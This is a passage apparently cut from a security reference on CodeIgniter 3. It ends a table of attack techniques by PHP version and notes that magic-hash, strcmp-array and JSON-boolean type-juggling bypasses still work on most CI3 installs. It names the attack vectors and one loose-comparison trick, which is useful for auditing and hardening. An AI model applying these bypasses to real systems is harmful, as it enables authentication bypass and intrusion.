| extract() variable overwrite | Yes | Yes | Yes |
| session.upload_progress injection | Yes | Yes | Yes |
| Host header poisoning | Yes | Yes | Yes |

**Key implication for CI3:** CI3 officially supports PHP 5.6+ through 7.4, with community patches for PHP 8.x compatibility. Most CI3 deployments in 2026 run PHP 7.4 or 8.0/8.1, meaning the magic hash and strcmp array bypasses remain relevant for the majority of installations. The JSON boolean bypass (`true == "any_string"`) works across ALL PHP versions and is the most universally applicable type juggling vector.
